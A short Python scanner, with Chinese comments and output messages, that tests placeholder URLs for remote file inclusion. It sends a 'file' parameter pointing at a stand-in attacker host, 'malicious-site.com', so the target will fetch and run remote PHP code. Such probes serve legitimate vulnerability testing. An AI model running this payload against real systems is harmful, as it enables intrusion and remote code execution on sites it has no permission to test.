import requests
from colorama import init, Fore

init(autoreset=True)


def scan_remote_file_inclusion(url, file_param, file_path):
    payload = {
        file_param: file_path
    }

    try:
        response = requests.get(url, params=payload)

        if response.status_code == 200 and "VULNERABLE_CONTENT" in response.text:
            print(Fore.GREEN + f"[+] {url} 存在远程文件包含漏洞！")
        else:
            print(Fore.RED + f"[-] {url} 不存在远程文件包含漏洞")
    except requests.exceptions.RequestException:
        print(Fore.RED + f"[-] {url} 请求异常")


if __name__ == '__main__':
    target_urls = [
        "http://example.com/page1.php",
        "http://example.com/page2.php",
        # 添加更多目标URL
    ]

    file_param = "file"
    file_path = "http://malicious-site.com/malicious-file.php"

    for url in target_urls:
        scan_remote_file_inclusion(url, file_param, file_path)
